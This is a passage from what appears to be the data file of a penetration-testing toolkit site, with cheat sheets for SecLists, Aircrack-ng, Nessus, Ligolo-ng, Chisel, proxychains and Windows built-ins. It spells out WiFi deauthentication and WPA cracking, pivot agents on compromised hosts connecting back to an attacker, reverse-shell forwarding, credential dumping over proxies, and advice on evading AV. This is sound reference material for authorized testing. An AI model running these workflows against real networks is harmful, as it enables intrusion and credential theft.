                "label": "CeWL — GitHub (digininja)",
                "url": "https://github.com/digininja/CeWL"
              },
              {
                "label": "Toolkit — SecLists",
                "url": "tool-detail.html?tool=seclists"
              }
            ]
          }
        ]
      },
      {
        id: "seclists",
        name: "SecLists",
        url: "https://github.com/danielmiessler/SecLists",
        description: "The wordlist collection nearly every fuzzing tool ends up pointing at.",
        brief: "SecLists is the wordlist collection nearly every fuzzing and brute-force tool ends up pointing at — usernames, passwords, discovery paths, DNS, and fuzzing payload seeds, all grouped by purpose in one repo.",
        quickReference: [
          { label: "Clone the repo", cmd: "git clone https://github.com/danielmiessler/SecLists.git" },
          { label: "Default web discovery list", cmd: "SecLists/Discovery/Web-Content/common.txt" },
          { label: "Default password list", cmd: "SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" },
          { label: "Default subdomain list", cmd: "SecLists/Discovery/DNS/subdomains-top1million-5000.txt" }
        ],
        sections: [
          {
            title: "Discovery Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Discovery/Web-Content/", "Directory and file brute-forcing wordlists"],
              ["Discovery/DNS/", "Subdomain brute-forcing wordlists"],
              ["Discovery/SNMP/", "Common SNMP community strings"]
            ]
          },
          {
            title: "Web Content Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["common.txt", "General-purpose default — good first pass"],
              ["quickhits.txt", "Small, low-noise, fast pass"],
              ["raft-small/-medium/-large-directories.txt", "Bigger lists, in order of size/time tradeoff"],
              ["raft-large-files.txt", "Common filenames rather than directories"]
            ]
          },
          {
            title: "DNS Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["subdomains-top1million-5000.txt", "Fast, good default subdomain list"],
              ["subdomains-top1million-20000.txt", "Bigger, slower, more coverage"],
              ["namelist.txt", "Broader general-purpose DNS wordlist"]
            ]
          },
          {
            title: "Usernames",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Usernames/Names/names.txt", "Common first/last names — good for generating username permutations"],
              ["Usernames/top-usernames-shortlist.txt", "Small, high-hit-rate default account names"],
              ["Usernames/cirt-default-usernames.txt", "Known vendor default usernames"]
            ]
          },
          {
            title: "Passwords",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Passwords/Leaked-Databases/rockyou.txt", "The classic — huge, real-world leaked password corpus"],
              ["Passwords/Common-Credentials/", "Smaller curated common-password lists"],
              ["Passwords/Default-Credentials/", "Known vendor default username:password pairs"]
            ]
          },
          {
            title: "Fuzzing Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Fuzzing/", "General-purpose fuzzing payload seeds for input-handling tests"],
              ["Fuzzing/big-list-of-naughty-strings.txt", "Edge-case strings (unicode, encoding, format issues) for input validation testing"]
            ]
          },
          {
            title: "Recommended Lists",
            type: "table",
            columns: ["If you only grab three", "Use it for"],
            rows: [
              ["Discovery/Web-Content/common.txt", "Directory/file brute-forcing"],
              ["Passwords/Leaked-Databases/rockyou.txt", "Password cracking/spraying"],
              ["Discovery/DNS/subdomains-top1million-5000.txt", "Subdomain enumeration"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Typical workflow", cmd: "git clone https://github.com/danielmiessler/SecLists.git\n# pick list size based on time budget — start small, escalate if nothing hits\nffuf -w SecLists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ\n# escalate:\nffuf -w SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://target.com/FUZZ" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Bigger isn't always better — a huge wordlist against a slow endpoint can take hours; start small and escalate only if needed.",
              "Keep the repo updated (git pull) — lists get added and revised over time.",
              "Combine two lists with separate keywords (e.g. -w users.txt:USER -w passwords.txt:PASS) where the target tool supports it."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Wireless Security",
    tools: [
      {
        id: "aircrack-ng",
        name: "Aircrack-ng Suite",
        url: "https://www.aircrack-ng.org/",
        description: "WiFi auditing suite — capture, handshake collection, and WPA/WPA2 cracking.",
        brief: "Aircrack-ng is a suite of tools for auditing WiFi networks — monitor-mode capture, handshake collection, deauthentication, and offline WPA/WPA2 key cracking, all working off the same .cap capture files.",
        quickReference: [
          { label: "Enable monitor mode", cmd: "airmon-ng start wlan0" },
          { label: "Capture and scan for targets", cmd: "airodump-ng wlan0mon" },
          { label: "Deauth a client (forces a handshake)", cmd: "aireplay-ng --deauth 5 -a <bssid> wlan0mon" },
          { label: "Crack a captured handshake", cmd: "aircrack-ng -w wordlist.txt -b <bssid> capture.cap" }
        ],
        sections: [
          {
            title: "Monitor Mode",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["airmon-ng check kill", "Kill processes that tend to interfere with monitor mode (NetworkManager, wpa_supplicant)"],
              ["airmon-ng start wlan0", "Put the adapter into monitor mode (usually creates wlan0mon)"],
              ["airmon-ng stop wlan0mon", "Revert the adapter back to managed mode when done"]
            ]
          },
          {
            title: "Capture",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["airodump-ng wlan0mon", "General scan — lists nearby networks and connected clients"],
              ["airodump-ng -c <ch> --bssid <bssid> -w capture wlan0mon", "Targeted capture on one network/channel, written to a file"],
              ["Reading the output", "BSSID / PWR / CH / ENC / ESSID columns identify the network; the station table below shows connected clients"]
            ]
          },
          {
            title: "Handshake Collection",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Targeted airodump-ng capture", "Leave a targeted capture running while waiting for a client to (re)connect"],
              ["WPA handshake indicator", "airodump-ng shows a handshake notice in the top-right once one is captured"],
              ["aircrack-ng capture.cap -b <bssid>", "Quick check on an existing capture file to confirm a handshake is actually present"]
            ]
          },
          {
            title: "WPA/WPA2 Cracking",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["aircrack-ng -w wordlist.txt -b <bssid> capture.cap", "Offline dictionary attack against a captured handshake"],
              ["hcxpcapngtool -o hash.hc22000 capture.cap", "Convert a capture for GPU-accelerated cracking with hashcat instead"],
              ["Feasibility caveat", "This only works against dictionary-guessable passphrases — a strong passphrase makes the whole approach impractical"]
            ]
          },
          {
            title: "Deauthentication",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["aireplay-ng --deauth 5 -a <bssid> wlan0mon", "Deauth every client on a network — forces reconnects, useful for capturing a handshake"],
              ["aireplay-ng --deauth 5 -a <bssid> -c <client_mac> wlan0mon", "Deauth one specific client instead of the whole network"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full handshake-and-crack workflow", cmd: "airmon-ng check kill\nairmon-ng start wlan0\nairodump-ng wlan0mon\n# note the target BSSID + channel, then:\nairodump-ng -c <ch> --bssid <bssid> -w capture wlan0mon\n# in a second terminal, force a reconnect:\naireplay-ng --deauth 5 -a <bssid> wlan0mon\n# once the handshake is confirmed captured:\naircrack-ng -w wordlist.txt -b <bssid> capture.cap" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Only test networks you own or have explicit written authorization to test — deauthing or cracking a network without authorization is illegal in most jurisdictions.",
              "Requires a wireless adapter whose chipset supports both monitor mode and packet injection — not all of them do.",
              "This cracking approach targets WPA/WPA2-PSK specifically — WPA3's SAE handshake isn't vulnerable to the same offline dictionary attack.",
              "Cracking feasibility depends entirely on the passphrase being weak or dictionary-guessable — a strong passphrase makes this impractical regardless of wordlist size."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Vulnerability Scanning",
    tools: [
      {
        id: "nessus",
        name: "Nessus",
        url: "https://www.tenable.com/products/nessus",
        description: "Vulnerability scanner for CVEs, misconfigurations, and missing patches.",
        brief: "Nessus is a vulnerability scanner used to identify known CVEs, misconfigurations, and missing patches across a network. Credentialed scans (with valid local auth) return dramatically more accurate results than remote-only checks — get creds into scope whenever the engagement allows it.",
        quickReference: [
          { label: "Default general-purpose scan", cmd: "Scan Templates > Basic Network Scan" },
          { label: "Best results, whenever you have creds", cmd: "Add credentials under the scan's Credentials tab (Credentialed Scan)" },
          { label: "Benchmark-based audits (CIS, STIG, etc.)", cmd: "Scan Templates > Compliance Scan" },
          { label: "Triage results fast", cmd: "Review by Plugin Family first, before drilling into individual hosts" }
        ],
        sections: [
          {
            title: "Scan Templates",
            type: "table",
            columns: ["Template", "Description"],
            rows: [
              ["Basic Network Scan", "General-purpose default — host discovery, common services, default plugin set"],
              ["Advanced Scan", "Full manual control over every scan setting and plugin family"],
              ["Credentialed Patch Audit", "Authenticated, patch-focused scan against local vulnerabilities"],
              ["Compliance Scan", "Benchmark/policy-based (CIS, DISA STIG, PCI-DSS, etc.)"],
              ["Web Application Tests", "Basic web-focused checks — not a substitute for manual/Burp-style testing"]
            ]
          },
          {
            title: "Basic Network Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Coverage", "Host discovery plus common port/service checks against the default plugin set"],
              ["Typical use", "A fast first pass across an unfamiliar network before deciding where to go deeper"]
            ]
          },
          {
            title: "Advanced Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Plugin family selection", "Full manual control over which plugin families are in/out of scope"],
              ["Custom port ranges", "Scope the scan to exactly the ports relevant to the engagement"],
              ["Timing/performance tuning", "Adjust scan aggressiveness for fragile or bandwidth-constrained networks"]
            ]
          },
          {
            title: "Credentialed Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Credentials supplied", "SSH, SMB/Windows, database, or other local auth, set under the scan's Credentials tab"],
              ["Why it matters", "Local checks (installed packages, patch level) are far more accurate than remote version-guessing"],
              ["Setup", "Store credentials once in Tenable's credential manager, reuse across scan policies"]
            ]
          },
          {
            title: "Compliance Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Benchmark selection", "Choose a standard like CIS Level 1/2 or DISA STIG at scan setup"],
              ["Reporting style", "Pass/fail per control, not a CVE list — built for audits rather than pentests"]
            ]
          },
          {
            title: "Plugin Families",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What a family groups", "Related plugins under one label, e.g. \"Windows\", \"Web Servers\", \"Default Unix Accounts\""],
              ["Scoping a scan", "Enable/disable whole families to focus a scan or cut noise/runtime"],
              ["Why triage by family first", "Skimming by family surfaces patterns (e.g. \"every host missing the same patch\") far faster than reading findings host-by-host"]
            ]
          },
          {
            title: "Policies",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Policy vs. scan", "A policy is a reusable saved configuration; a scan is a specific run using one"],
              ["Common practice", "Maintain a standing \"default internal\" and \"default external\" policy rather than reconfiguring every time"]
            ]
          },
          {
            title: "Reports",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Export formats", "HTML, PDF, CSV, or Nessus's native format"],
              ["Severity breakdown", "Critical / High / Medium / Low / Info"],
              ["Filtering", "Filter the report view by plugin family or by host before exporting"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Running a credentialed internal scan", cmd: "1. New Scan > Basic Network Scan\n2. Credentials tab > add SSH/SMB creds\n3. Set scope to the internal range\n4. Launch\n5. Once complete, triage by Plugin Family first" },
              { label: "Compliance audit workflow", cmd: "1. New Scan > Compliance Scan\n2. Select the benchmark (e.g. CIS Level 1)\n3. Add credentials\n4. Run against in-scope hosts\n5. Export the pass/fail report for the audit record" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Credentialed scans return far more accurate results than remote-only checks — prioritize getting valid creds into scope wherever the engagement allows it.",
              "Keep the plugin feed updated; a stale feed misses recently disclosed vulnerabilities entirely.",
              "Spot-check a handful of findings manually before including them in a report — automated scanners do produce false positives.",
              "Heavy/aggressive scans can impact fragile or legacy systems — plan scan windows and throttling on production networks."
            ]
          }
        ]
      }
    ]
  },
  {
    "category": "Pivoting & Tunnelling",
    "tools": [
      {
        "id": "ligolo-ng",
        "name": "Ligolo-ng",
        "url": "https://github.com/nicocha30/ligolo-ng",
        "description": "Tunnel into an internal network through a TUN interface — route a whole subnet via a compromised host, no SOCKS/proxychains required.",
        "brief": "Ligolo-ng gives you a userland VPN-style pivot: a proxy runs on your attack box and an agent runs on the compromised host; the agent dials back over TLS and the proxy exposes the target's networks as a real tun interface on your machine.\n\nYou add a route for the internal subnet and every tool on your box reaches it natively — nmap SYN scans, raw sockets, the lot — with no proxychains in front. The agent needs no admin/root on the target (only the proxy side needs privileges, on your own box, to create the interface). Listeners forward ports back through the tunnel for reverse shells and file transfer. Values shown as <…> are placeholders.",
        "quickReference": [
          {
            "label": "Proxy on your attack box (self-signed TLS)",
            "cmd": "sudo ./proxy -selfcert   # listens on 0.0.0.0:11601"
          },
          {
            "label": "Agent on the compromised host",
            "cmd": "./agent -connect <attacker>:11601 -ignore-cert"
          },
          {
            "label": "In the ligolo console — bring up the tunnel",
            "cmd": "session            # pick the agent\ninterface_create --name ligolo\nroute_add --name ligolo --route 10.10.20.0/24\ntunnel_start --tun ligolo"
          },
          {
            "label": "Now use any tool natively (no proxychains)",
            "cmd": "nmap -sV -p445,3389 10.10.20.0/24"
          }
        ],
        "sections": [
          {
            "title": "How it works",
            "type": "notes",
            "items": [
              "Two parts: the proxy (attack box, interactive console) and the agent (compromised host, connects back). The agent makes an outbound TLS connection to the proxy on 11601, so it is egress-friendly and needs no inbound rule on the target.",
              "Instead of a SOCKS proxy, the proxy presents the target's reachable networks as a tun interface on your machine. You create the interface, add a route for the internal CIDR, and start the tunnel — then your OS routes that subnet through the agent.",
              "Because it is a real network interface, every tool works natively — including nmap SYN scans and anything using raw sockets, which SOCKS/proxychains cannot carry. A TCP connect on your box becomes a TCP connect from the agent.",
              "Privilege: the AGENT needs no admin/root on the target. The PROXY needs root (or CAP_NET_ADMIN) on YOUR box to create the tun interface — that is local to you."
            ]
          },
          {
            "title": "Proxy & agent (setup)",
            "type": "table",
            "columns": [
              "Side / flag",
              "What it does"
            ],
            "rows": [
              [
                "proxy -selfcert",
                "Start the proxy with a dynamically generated self-signed cert (lab/quick use)"
              ],
              [
                "proxy -laddr 0.0.0.0:11601",
                "Listening address/port (default 11601; prefix https:// for a websocket listener)"
              ],
              [
                "proxy -certfile / -keyfile",
                "Use your own TLS cert/key instead of -selfcert"
              ],
              [
                "agent -connect <attacker>:11601",
                "Agent dials back to the proxy"
              ],
              [
                "agent -ignore-cert",
                "Skip TLS validation — needed with -selfcert (lab only)"
              ],
              [
                "agent -accept-fingerprint <sha256>",
                "Pin the proxy's cert fingerprint instead of ignoring it — the safe way (get it with certificate_fingerprint)"
              ],
              [
                "agent -retry / -reconnect",
                "Keep trying on initial failure / auto-reconnect if the link drops"
              ],
              [
                "agent -proxy socks://… | http://…",
                "Reach the proxy through an upstream SOCKS/HTTP proxy"
              ]
            ]
          },
          {
            "title": "Console commands",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "session",
                "Select the active agent session to operate on"
              ],
              [
                "ifconfig",
                "Show the agent's network interfaces — tells you which internal subnets it can reach"
              ],
              [
                "interface_create --name ligolo",
                "Create a local tun interface"
              ],
              [
                "route_add --name ligolo --route <cidr>",
                "Route an internal subnet through the tunnel (repeat per subnet)"
              ],
              [
                "autoroute",
                "Interactive helper: reads the agent's interfaces and sets up the tun + routes for you"
              ],
              [
                "tunnel_start --tun ligolo",
                "Start forwarding the selected session's traffic over the interface"
              ],
              [
                "listener_add --addr 0.0.0.0:<p> --to 127.0.0.1:<p> --tcp",
                "Open a listener ON THE AGENT that forwards back to your box (reverse shells, file pull)"
              ],
              [
                "listener_list / listener_stop",
                "Manage agent-side listeners"
              ],
              [
                "certificate_fingerprint",
                "Print the proxy's cert SHA256 — use it with the agent's -accept-fingerprint"
              ]
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Stand up the pivot end-to-end",
                "cmd": "# 1) attack box (root, for the tun interface):\nsudo ./proxy -selfcert\n# 2) compromised host:\n./agent -connect <attacker>:11601 -ignore-cert\n# 3) in the ligolo console:\nsession                                   # select the agent\nifconfig                                  # see its internal subnets\ninterface_create --name ligolo\nroute_add --name ligolo --route 10.10.20.0/24\ntunnel_start --tun ligolo"
              },
              {
                "label": "Use the internal network like it's local",
                "cmd": "# no proxychains — full tooling works:\nnmap -sS -p- 10.10.20.5\nnxc smb 10.10.20.0/24 -u user -p pass\nevil-winrm -i 10.10.20.5 -u user -p pass"
              },
              {
                "label": "Catch a reverse shell from an internal host",
                "cmd": "# make the agent listen on the target and forward to YOUR handler:\nlistener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp\n# the internal victim connects to <agent_ip>:4444 -> it arrives at your 127.0.0.1:4444"
              },
              {
                "label": "Double pivot (reach a deeper subnet)",
                "cmd": "# run a second agent on a host inside 10.10.20.0/24, connect it back\n# through the first tunnel, then add another interface + route for 10.10.30.0/24\ninterface_create --name ligolo2\nroute_add --name ligolo2 --route 10.10.30.0/24\ntunnel_start --tun ligolo2"
              }
            ]
          },
          {
            "title": "OPSEC & notes",
            "type": "notes",
            "items": [
              "Pin the cert: run certificate_fingerprint on the proxy and start the agent with -accept-fingerprint <sha256> instead of -ignore-cert, so the TLS link can't be MITM'd.",
              "The agent is a single static Go binary and needs no admin on the target — but it is large and signatured; drop it to a writable path, obfuscate/pack if AV is a concern, and remove it on cleanup.",
              "Port 11601 and the long-lived outbound TLS session are the network signal — change the port, front the proxy with a redirector/real domain, and prefer -accept-fingerprint for real engagements.",
              "Add only the routes you need (route_add per subnet); routing an over-broad CIDR through the tunnel can blackhole your own box's traffic.",
              "Unlike SOCKS/proxychains, Ligolo carries SYN scans and raw sockets because it is a real interface — the main reason to reach for it over Chisel+proxychains on a complex internal network."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Ligolo-ng — GitHub (nicocha30)",
                "url": "https://github.com/nicocha30/ligolo-ng"
              },
              {
                "label": "Toolkit — Chisel (SOCKS-based pivot)",
                "url": "tool-detail.html?tool=chisel"
              },
              {
                "label": "Toolkit — proxychains",
                "url": "tool-detail.html?tool=proxychains"
              }
            ]
          }
        ]
      },
      {
        "id": "chisel",
        "name": "Chisel",
        "url": "https://github.com/jpillora/chisel",
        "description": "Fast TCP/UDP tunnel over HTTP, secured via SSH — reverse SOCKS proxy and port forwarding through one firewall-friendly port.",
        "brief": "Chisel is a single-binary (Go) tunnel that multiplexes TCP/UDP over an HTTP connection secured with an SSH layer. One side runs as a server, the other as a client; because everything rides a single outbound HTTP(S) port it slips through egress filtering that blocks arbitrary ports.\n\nThe headline use on an engagement is a reverse SOCKS proxy: run the server on your attack box, run the client on a compromised host, and you get a SOCKS5 proxy on your box that routes into the target's internal network — then point proxychains or a browser at it. It also does explicit forward and reverse port-forwards. Values shown as <…> are placeholders; always set --auth on anything you expose.",
        "quickReference": [
          {
            "label": "Server on your attack box (reverse mode)",
            "cmd": "chisel server -p 8080 --reverse --socks5"
          },
          {
            "label": "Client on the compromised host — reverse SOCKS",
            "cmd": "chisel client <attacker>:8080 R:socks"
          },
          {
            "label": "Point proxychains at the SOCKS proxy",
            "cmd": "# SOCKS5 now on 127.0.0.1:1080 on your attack box\nproxychains -q nmap -sT -Pn -p445,3389 10.10.20.0/24"
          },
          {
            "label": "Single reverse port-forward",
            "cmd": "chisel client <attacker>:8080 R:13389:10.10.20.5:3389"
          }
        ],
        "sections": [
          {
            "title": "How it works",
            "type": "notes",
            "items": [
              "Two roles over one connection: one side is the server (listens for the HTTP tunnel), the other is the client (dials out). Traffic is multiplexed over a single HTTP(S) port and encrypted inside an SSH layer, so it survives egress filtering that only allows web ports.",
              "Reverse vs forward is about which side opens the listening socket. A forward tunnel listens on the CLIENT; a reverse tunnel (the R: prefix) listens on the SERVER and routes into the client's network — which is what you want when the client is the compromised host and you're pivoting inward.",
              "--reverse must be set on the SERVER to permit any R: tunnels from clients; without it the server refuses them.",
              "A reverse SOCKS proxy (R:socks) is the most useful mode: it opens a SOCKS5 listener on the server (default 127.0.0.1:1080) that proxies arbitrary TCP into the compromised host's network — one tunnel, access to the whole subnet."
            ]
          },
          {
            "title": "Server (attack box)",
            "type": "table",
            "columns": [
              "Flag",
              "What it does"
            ],
            "rows": [
              [
                "chisel server -p 8080 --reverse",
                "Listen on 8080 and allow reverse (R:) tunnels from clients"
              ],
              [
                "--socks5",
                "Allow clients to open a reverse SOCKS5 proxy (R:socks)"
              ],
              [
                "--auth <user>:<pass>",
                "Require credentials — always set this on an exposed server"
              ],
              [
                "--keyfile key.pem",
                "Load a persistent host key (generate one with --keygen) so clients can pin it"
              ],
              [
                "--tls-key / --tls-cert",
                "Wrap the tunnel in real TLS — serve the pivot over HTTPS"
              ],
              [
                "--host 0.0.0.0 / -p <port>",
                "Bind address and port (-p is shorthand for --port)"
              ]
            ]
          },
          {
            "title": "Client (compromised host)",
            "type": "table",
            "columns": [
              "Tunnel spec / flag",
              "What it does"
            ],
            "rows": [
              [
                "R:socks",
                "Reverse SOCKS5 — proxy on the server's 127.0.0.1:1080 into this host's network"
              ],
              [
                "R:1080:socks",
                "Same, but choose the SOCKS listen port on the server explicitly"
              ],
              [
                "R:<lport>:<rhost>:<rport>",
                "Reverse single forward — server:lport reaches rhost:rport from this host"
              ],
              [
                "<lport>:<rhost>:<rport>",
                "Forward tunnel — listen on the CLIENT, reach rhost:rport via the server"
              ],
              [
                "--auth <user>:<pass>",
                "Match the server's credentials"
              ],
              [
                "--fingerprint <fp>",
                "Verify the server's key (pin it — prevents a MITM on the tunnel)"
              ],
              [
                "--keepalive 25s",
                "Send keepalives so the tunnel survives idle NAT/firewall timeouts"
              ]
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Reverse SOCKS pivot (the usual one)",
                "cmd": "# 1) attack box:\nchisel server -p 8080 --reverse --socks5 --auth op:<pass>\n# 2) compromised host (same auth):\nchisel client --auth op:<pass> <attacker>:8080 R:socks\n# 3) use it — SOCKS5 on 127.0.0.1:1080:\nproxychains -q nxc smb 10.10.20.0/24 -u user -p pass"
              },
              {
                "label": "Expose one internal service to your box",
                "cmd": "# reach internal RDP (10.10.20.5:3389) on your own 127.0.0.1:13389\n# client, on the compromised host:\nchisel client <attacker>:8080 R:13389:10.10.20.5:3389\nxfreerdp /v:127.0.0.1:13389 /u:user /p:pass"
              },
              {
                "label": "Forward tunnel (reach an attacker-side service from the target)",
                "cmd": "# make your box's :8000 reachable on the compromised host's 127.0.0.1:8000\nchisel client <attacker>:8080 8000:127.0.0.1:8000"
              },
              {
                "label": "Run over HTTPS behind a redirector",
                "cmd": "chisel server -p 443 --reverse --tls-key key.pem --tls-cert cert.pem --auth op:<pass>\nchisel client --auth op:<pass> https://<redirector>:443 R:socks"
              }
            ]
          },
          {
            "title": "OPSEC & notes",
            "type": "notes",
            "items": [
              "Always set --auth: an unauthenticated --reverse --socks5 server is an open proxy into your target's network for anyone who finds it.",
              "Pin the server key with --fingerprint on the client so the tunnel can't be MITM'd; serve over real TLS (--tls-cert) and front it with a redirector for anything beyond a lab.",
              "A single long-lived connection to an odd port plus a chisel process is the detection surface — use 443/HTTPS, a believable host via a redirector, and --keepalive so it reads like a normal long poll.",
              "Chisel tunnels TCP (and UDP via U: specs). ICMP doesn't traverse it, so scans through the SOCKS proxy must be TCP connect (nmap -sT -Pn).",
              "Drop the binary to a writable, non-flagged path and clean it up afterwards; the Go binary is large and signatured — pack/obfuscate or use a stripped static build where AV is a concern."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Chisel — GitHub (jpillora)",
                "url": "https://github.com/jpillora/chisel"
              },
              {
                "label": "Toolkit — proxychains (consume the SOCKS proxy)",
                "url": "tool-detail.html?tool=proxychains"
              },
              {
                "label": "Toolkit — Ligolo-ng (TUN-based alternative)",
                "url": "tool-detail.html?tool=ligolo-ng"
              }
            ]
          }
        ]
      },
      {
        "id": "proxychains",
        "name": "proxychains-ng",
        "url": "https://github.com/rofl0r/proxychains-ng",
        "description": "Force any program's TCP connections through a proxy (or a chain of them) — the standard way to drive tooling over a SOCKS pivot.",
        "brief": "proxychains-ng (the maintained fork, usually the proxychains4 binary) hooks a program's network calls with an LD_PRELOAD shim and redirects its TCP connections through one or more proxies — most often a SOCKS5 proxy opened by Chisel, Ligolo, a Meterpreter/beacon socks module, or an SSH -D tunnel.\n\nIt turns \"I have a SOCKS proxy into the internal network\" into \"all my normal tools now reach the internal network.\" It is TCP-only and cannot carry ICMP or (normally) UDP, which shapes how you scan through it.",
        "quickReference": [
          {
            "label": "Run a tool through the default config",
            "cmd": "proxychains -q nmap -sT -Pn -p445,3389 10.10.20.5"
          },
          {
            "label": "Use a specific config file",
            "cmd": "proxychains -f ./pivot.conf impacket-secretsdump CORP/user@10.10.20.5"
          },
          {
            "label": "Minimal config — one SOCKS5 proxy",
            "cmd": "# /etc/proxychains4.conf\nstrict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 1080"
          }
        ],
        "sections": [
          {
            "title": "How it works",
            "type": "notes",
            "items": [
              "proxychains preloads a library (LD_PRELOAD) that intercepts connect()/getaddrinfo() in the target program and reroutes its TCP through the configured proxies. It needs no privileges and no change to the program.",
              "Config is read from ./proxychains.conf, then ~/.proxychains/proxychains.conf, then /etc/proxychains4.conf — or whatever you pass with -f. The binary is usually proxychains4; many distros also ship a proxychains symlink.",
              "It is TCP-only: it cannot tunnel ICMP (no ping, no nmap -sn/-PE) and does not proxy UDP in general. DNS is the exception, handled specially via proxy_dns."
            ]
          },
          {
            "title": "Config file",
            "type": "table",
            "columns": [
              "Directive",
              "What it does"
            ],
            "rows": [
              [
                "strict_chain",
                "Route through every proxy in the list, in order; fail if any is down (default, predictable)"
              ],
              [
                "dynamic_chain",
                "Route through the listed proxies in order but skip dead ones — more resilient for a chain"
              ],
              [
                "random_chain",
                "Use a random proxy (or subset) per connection; pair with chain_len to set how many"
              ],
              [
                "proxy_dns",
                "Resolve DNS through the proxy — prevents DNS leaks and lets internal names resolve"
              ],
              [
                "tcp_connect_time_out / tcp_read_time_out",
                "Connect/read timeouts in ms — raise them over slow, high-latency tunnels"
              ],
              [
                "quiet_mode",
                "Suppress the per-connection [proxychains] log lines (same as -q)"
              ],
              [
                "[ProxyList]",
                "One proxy per line: 'socks5 <ip> <port> [user pass]', also socks4 / http"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Scan through a SOCKS pivot (TCP connect only)",
                "cmd": "# SYN/ICMP can't traverse a SOCKS proxy — force TCP connect + no ping:\nproxychains -q nmap -sT -Pn -n -p 22,445,3389,5985 10.10.20.0/24"
              },
              {
                "label": "Drive AD tooling over the pivot",
                "cmd": "proxychains -q nxc smb 10.10.20.0/24 -u user -p pass\nproxychains -q impacket-secretsdump CORP/user:pass@10.10.20.5\nproxychains -q evil-winrm -i 10.10.20.5 -u user -p pass"
              },
              {
                "label": "Browse an internal web app",
                "cmd": "proxychains -q firefox   # the browser's traffic now rides the pivot"
              },
              {
                "label": "Per-engagement config without touching /etc",
                "cmd": "proxychains4 -f ~/engagements/corp/pivot.conf -q <command>"
              }
            ]
          },
          {
            "title": "Notes & gotchas",
            "type": "notes",
            "items": [
              "Set proxy_dns so internal hostnames resolve through the tunnel and you don't leak lookups to your local resolver — but note it adds latency to every connection.",
              "Scanning through proxychains is slow and must be TCP connect (-sT -Pn); keep port lists tight and prefer a tool with built-in concurrency (nxc, fscan) over a broad nmap sweep.",
              "strict_chain with one proxy is the reliable default; use dynamic_chain when chaining multiple hops so one dead hop doesn't kill every connection.",
              "Statically-linked binaries ignore LD_PRELOAD, so proxychains can't hook them (some Go tools) — use the tool's own --proxy/-x flag, or a TUN-based pivot (Ligolo-ng) instead.",
              "Raise tcp_connect_time_out/tcp_read_time_out over a laggy multi-hop tunnel, or you'll get false 'closed' results."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "proxychains-ng — GitHub (rofl0r)",
                "url": "https://github.com/rofl0r/proxychains-ng"
              },
              {
                "label": "Toolkit — Chisel (open the SOCKS proxy)",
                "url": "tool-detail.html?tool=chisel"
              },
              {
                "label": "Toolkit — Ligolo-ng (no proxychains needed)",
                "url": "tool-detail.html?tool=ligolo-ng"
              }
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Post Exploitation",
    tools: [
      {
        "id": "windows-builtins",
        "name": "Windows Built-in Commands",
        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands",
        "description": "The native cmd.exe toolset for post-exploitation on Windows — context, privileges, ACLs, users, AD recon, services, and networking without dropping a single binary.",
        "brief": "Every Windows host already ships the tools you need to orient yourself after a foothold — no upload, no AV flag, no download. This page collects the built-in cmd.exe commands worth knowing: who you are and what you can do (whoami /priv, whoami /all), file permissions (icacls, takeown), running as another identity (runas, cmdkey), local and domain account enumeration (net user, net group), Active Directory recon (nltest, dsquery, setspn, klist, gpresult), service and task inspection (sc, schtasks, tasklist), and networking (ipconfig, netstat, arp, netsh).\n\nThese are \"living off the land\": they're signed, expected, and rarely alerted on by themselves, which makes them the quiet first move before reaching for noisier tooling. Everything here is read-first enumeration; the few state-changing commands (icacls /grant, sc config, netsh firewall) are called out as such. Values shown as <…> are placeholders.",
        "quickReference": [
          {
            "label": "Who am I, what can I do (the first three commands)",
            "cmd": "whoami /priv\nwhoami /groups\nwhoami /all"
          },
          {
            "label": "View effective permissions on a file/dir",
            "cmd": "icacls \"C:\\Path\\To\\target\""
          },
          {
            "label": "Run a shell as another user (prompts for password)",
            "cmd": "runas /user:DOMAIN\\user cmd"
          },
          {
            "label": "Find the domain controllers",
            "cmd": "nltest /dclist:<domain>"
          },
          {
            "label": "Hunt stored passwords in files",
